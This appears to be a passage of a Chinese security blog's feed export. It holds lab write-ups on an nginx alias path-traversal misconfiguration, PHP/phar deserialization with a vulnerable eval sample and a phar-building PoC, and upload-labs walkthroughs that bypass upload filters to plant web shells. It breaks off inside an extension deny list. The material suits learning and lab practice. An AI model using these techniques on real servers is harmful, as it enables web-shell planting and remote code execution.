<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location /hello/ &#123;</span><br><span class="line"> <span class="built_in">alias</span> /var/www/image/</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 若按照上述配置的话，访问/hello目录里面的文件时, nginx会自动去/var/www/image目录找文件</span></span><br></pre></td></tr></table></figure>

<p>这个漏洞我们主要针对<strong>alias</strong>来说。</p>
<p>打开靶场的配置文件，我们可以看到<code>location /files</code>后面没有以<code>/</code>结尾</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210725140009372.png" alt="image-20210725140009372"></p>
<p>这意味着我们可以跨越到其他目录。</p>
<p>当我们访问<code>/files..</code>的时候，<code>/files</code>会变为<code>/home/</code>,而我们访问的地址将是<code>/home/..</code>，实际便跨越了目录。</p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210725140308072.png" alt="image-20210725140308072"></p>
<p>成功访问了上级目录</p>
<h2 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/leslie1943/p/13764482.html">Nginx: nginx配置文件中的 alias 和 root</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>php与phar反序列化漏洞小结</title>
    <url>/2021/07/08/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞（unseriliaze）"><a href="#PHP反序列化漏洞（unseriliaze）" class="headerlink" title="PHP反序列化漏洞（unseriliaze）"></a>PHP反序列化漏洞（unseriliaze）</h1><h2 id="什么是PHP反序列化漏洞"><a href="#什么是PHP反序列化漏洞" class="headerlink" title="什么是PHP反序列化漏洞"></a>什么是PHP反序列化漏洞</h2><blockquote>
<p><strong>php序列化</strong>的函数为 serialize ，可以将对象中的成员变量转换成字符串。 <strong>反序列化</strong>的函数为 unserilize ，可以将 serialize 生成的字符串重新还原为对象中的成员变量。 将用户可控的数据进行了<strong>反序列化</strong>，就是<strong>PHP反序列化漏洞</strong></p>
</blockquote>
<p>简单来说，就是我们可以控制<code>unserialize(a)</code>这个函数接收的参数<code>a</code>，比如通过<code>GET</code>或POST接收参数<code>a</code>，我们可以通过伪造自己的序列化后的恶意代码（通过修改程序原有的魔术方法属性），然后让unserialize()这个函数去反序列化我们构造的恶意代码，从而达到执行的效果。</p>
<span id="more"></span>

<h2 id="基础知识：序列化的属性权限问题"><a href="#基础知识：序列化的属性权限问题" class="headerlink" title="基础知识：序列化的属性权限问题"></a>基础知识：序列化的属性权限问题</h2><p>php在使用serialize()的时候产生的数据会根据attribute的权限不同，产生不同的数据和长度。</p>
<h3 id="private类型"><a href="#private类型" class="headerlink" title="private类型"></a>private类型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&#x27;bad&#x27;</span>;<span class="comment">//此处我们将flag设为private类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;flag=<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">set_flag</span>(<span class="string">&#x27;good&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);<span class="comment">//序列化这个object</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;<span class="comment">//把结果打出来</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>观察发现打出来的结果是：<code>O:4:&quot;test&quot;:1:&#123;s:10:&quot;testflag&quot;;s:6:&quot;Active&quot;;&#125;</code></p>
<p>此处代表属性名的testflag长度实际只有8，为什么却打出来有10个呢。这是因为他生成的格式是==%00类名%00属性名==</p>
<h3 id="protected类型"><a href="#protected类型" class="headerlink" title="protected类型"></a>protected类型</h3><p>生成格式为==%00*%00属性名==</p>
<h3 id="public类型"><a href="#public类型" class="headerlink" title="public类型"></a>public类型</h3><p>生成格式直接为==属性名==</p>
<h2 id="基础知识：魔法方法"><a href="#基础知识：魔法方法" class="headerlink" title="基础知识：魔法方法"></a>基础知识：魔法方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="construct()"></a><strong>construct()</strong></h3><p>对象创建时调用，但**unserialize()**不会调用</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup()"></a><strong>wakeup()</strong></h3><p>在unserialize()的时候会自动调用</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="destruct()"></a><strong>destruct()</strong></h3><p>当对象被销毁的时候会被调用</p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a><strong>toString()</strong></h3><p>当<strong>反序列化</strong>后的对象被输出在模版的时候会被调用</p>
<blockquote>
<p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行 == 比较时（PHP进行 == 比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<h3 id="get"><a href="#get" class="headerlink" title="get()"></a><strong>get()</strong></h3><p>当从不可访问的属性读取数据时调用</p>
<h3 id="call"><a href="#call" class="headerlink" title="call()"></a><strong>call()</strong></h3><p>当在对象上下文中调用不可访问的方法时触发</p>
<h2 id="基础知识：PHP反序列化利用条件"><a href="#基础知识：PHP反序列化利用条件" class="headerlink" title="基础知识：PHP反序列化利用条件"></a>基础知识：PHP反序列化利用条件</h2><ul>
<li>当前作用域必须要有该Class存在</li>
<li>序列化之序列化属性，不序列化Method，所以我们只能控制Attribute</li>
<li>在写payload的时候，我们只写与属性有关的内容，若涉及到方法，该方法也需要在原始的漏洞代码中存在。</li>
</ul>
<h1 id="PHP反序列化进阶：Phar反序列化漏洞"><a href="#PHP反序列化进阶：Phar反序列化漏洞" class="headerlink" title="PHP反序列化进阶：Phar反序列化漏洞"></a>PHP反序列化进阶：Phar反序列化漏洞</h1><h2 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是Phar</h2><p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。<a href="https://zh.wikipedia.org/wiki/PHAR_(%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F)#cite_note-file-ext-1">[来源于wiki]</a></p>
<h2 id="phar组成结构"><a href="#phar组成结构" class="headerlink" title="phar组成结构"></a>phar组成结构</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>phar文件的标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></p>
<p>xxx可以为任何内容，所以我们可以伪造图片来绕过上传限制</p>
<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>以序列化形式储存，含压缩文件属性等信息</p>
<p>当文件操作函数通过<strong>phar://伪协议</strong>来解析phar文件的时候就会将数据反序列化，所以我们可以利用<strong>系统文件操作函数</strong>来反序列化。</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，在文件的末尾</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li><p>文件上传点 - phar文件能够上传到服务端</p>
</li>
<li><p>有系统文件操作函数，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符未被过滤。</p>
<ul>
<li><p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708105320550.png" alt="image-20210708105320550"></p>
</li>
<li><p>只要是函数的实现过程间接或直接调用了php_stream_open_wrapper都可能触发phar反序列化漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>除了以上还有很多函数可能触发，更多的参见<a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">另一位师父的关于phar反序列化的文章</a></p>
</li>
</ul>
</li>
<li><p>有可用的魔术方法作为跳板</p>
</li>
<li><p>phar:// 伪协议</p>
</li>
</ul>
<h2 id="如何生成一个phar文件？"><a href="#如何生成一个phar文件？" class="headerlink" title="如何生成一个phar文件？"></a>如何生成一个phar文件？</h2><p>windows首先将php.ini里面的<code>phar.readonly</code>设为off，并把最前面的注释符去掉</p>
<p>在网上看见有师父提到linux环境下：</p>
<p><code>如果是linux环境下，需要在 /etc/php/7.0/apache2/php.ini 和/etc/php/7.0/cli/php.ini 这两个文件都需要修改 phar.readonly 否则不能生成phar文件</code></p>
<p>我本人用的是mac系统,在etc/private/php.ini直接修改即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//生成的文件后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php xxx; __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的object传入meta-data里</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;phartest.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p><strong>踩了一个坑：</strong></p>
<p>代码写好后，有一个坑，就是我直接运行浏览器运行php是不行的（提示500错误），研究以后猜测是权限问题，因为我的网站是搭建在library目录下的，后来改用命令行在<code>vscode</code>里运行提示也<code>permission denied</code>,加上<code>sudo</code>就好了。</p>
<h2 id="phar反序列化漏洞利用实例"><a href="#phar反序列化漏洞利用实例" class="headerlink" title="phar反序列化漏洞利用实例"></a>phar反序列化漏洞利用实例</h2><p><strong>漏洞代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;<span class="comment">//检测是否有名为filename的get请求</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">//获取该请求并赋值给filename</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;<span class="comment">//可以利用的class</span></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;echo &quot;hahaha&quot;;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//可以利用的魔术方法</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);<span class="comment">//这里eval会执行output的内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);<span class="comment">//可以利用的文件操作函数</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>POC:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;<span class="comment">//要利用的class</span></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;phpinfo();&#x27;</span>; <span class="comment">//我们只需要覆写output这个attribute的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//删除已存在的test.phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>实现：在get请求中采用phar://你的文件.phar的格式，成功执行代码</strong></p>
<p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708162848044.png" alt="image-20210708162848044"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>感谢<a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">K0rz3n大牛的php反序列化文章</a></p>
<p>感谢<a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Threezh1大牛的phar反序列化文章</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs Writeups</title>
    <url>/2021/07/14/upload-labs-%E9%80%9A%E5%85%B3WP/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在练习文件上传漏洞，正好拿<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>靶场练手。这里是在windows系统环境下进行的，建议直接使用作者提供的<a href="https://github.com/c0ny1/upload-labs/releases">windows集成环境</a>（之前我自己搭建的环境因为中间件和PHP配置不同，有些上传漏洞无法复原）。</p>
<h1 id="Pass-01-前端JS后缀名检测绕过"><a href="#Pass-01-前端JS后缀名检测绕过" class="headerlink" title="Pass-01 - 前端JS后缀名检测绕过"></a>Pass-01 - 前端JS后缀名检测绕过</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先常规思路，选择一个shell文件上传，同时用<code>Burp Suit</code>抓包</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210714224722994.png" alt="image-20210714224722994"></p>
<p>提示文件不允许上传，同时观察<code>Burp Suite</code>中并未抓到数据，说明此处是通过前端<code>js</code>文件来检查文件类型的。在<code>chrome</code>上用<code>Network</code>功能抓包，发现并未有任何<code>js</code>文件加载，于是猜测<strong>检测代码</strong>是直接写在当前页面的。</p>
<span id="more"></span>

<p>于是直接右键查看网站源代码，在源码底部可以看见我们需要的<code>javascript</code>代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们把shell文件后缀修改为jpg,然后再上传抓包,在<code>filename</code>处将文件名后缀改回php。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210714233757638.png" alt="image-20210714233757638"></p>
<p>上传成功，复制图像链接即可获得shell文件地址。</p>
<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p>主要是绕过前端javascript的文件名检测，可以先改成图片的格式，绕过js后通过抓包再修改回来。</p>
<h1 id="Pass-02-Content-Type绕过"><a href="#Pass-02-Content-Type绕过" class="headerlink" title="Pass-02 - Content-Type绕过"></a>Pass-02 - Content-Type绕过</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接上传php文件，出现<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210715012843947.png" alt="image-20210715012843947"></p>
<p><code>Burpsuite</code>抓包发现被拦截，所以我们推测是后端代码检测文件类型。</p>
<p><code>Burpsuite</code>抓包后直接修改<code>Content-Type</code>为<code>image/gif</code></p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210715013059979.png" alt="image-20210715013059979"></p>
<p>文件上传成功，成功绕过。</p>
<h2 id="方法总结-1"><a href="#方法总结-1" class="headerlink" title="方法总结"></a>方法总结</h2><p>根据其源码更好理解：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可知其仅判断文件类型：<code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>，使用<code>Burp Suite</code>修改<code>Content-Type</code>即可。</p>
<h1 id="Pass-03-PHP文件的其他格式绕过"><a href="#Pass-03-PHP文件的其他格式绕过" class="headerlink" title="Pass-03 - PHP文件的其他格式绕过"></a>Pass-03 - PHP文件的其他格式绕过</h1><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>先直接上传一个<code>shell.php</code>, 发现提示<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717095818207.png" alt="image-20210717095818207">，抓包也抓到了，说明此处是后端检测后缀名，但它并未检测<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀，所以我们直接上传该格式即可。</p>
<p>如果不解析上述后缀，我们可以在<code>httpd.conf</code>添加 <code>AddType application/x-httpd-php .php .phtml .php3 .php5</code></p>
<h2 id="方法总结-2"><a href="#方法总结-2" class="headerlink" title="方法总结"></a>方法总结</h2><p>看代码：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717101506612.png" alt="image-20210717101506612"></p>
<p>采用黑名单时，过滤后缀不全，我们可以尝试<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀。</p>
<h1 id="Pass-04-htaccess绕过（Apache-特性）"><a href="#Pass-04-htaccess绕过（Apache-特性）" class="headerlink" title="Pass-04 - .htaccess绕过（Apache 特性）"></a>Pass-04 - .htaccess绕过（Apache 特性）</h1><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>先上传一个<code>shell.php</code>，提示<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717101648489.png" alt="image-20210717101648489">，抓包抓到了，说明此处时后端检测文件。</p>
<p>再次按第三关的思路上传<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀，发现也被检测了。于是我们尝试上传**.htaccess**文件，内容为：<code>SetHandler application/x-httpd-php</code></p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717102255081.png" alt="image-20210717102255081"></p>
<p>再次上传任意后缀的shell木马,即可被解析成php文件</p>
<h2 id="方法总结-3"><a href="#方法总结-3" class="headerlink" title="方法总结"></a>方法总结</h2><blockquote>
<p>概述来说，htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>这一关我们就利用<code>.htaccess</code>文件指定所有文件后缀均解析为<code>php</code>，可见过滤<code>.htaccess</code>也尤为重要</p>
<h1 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 - 大小写绕过"></a>Pass-05 - 大小写绕过</h1><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span 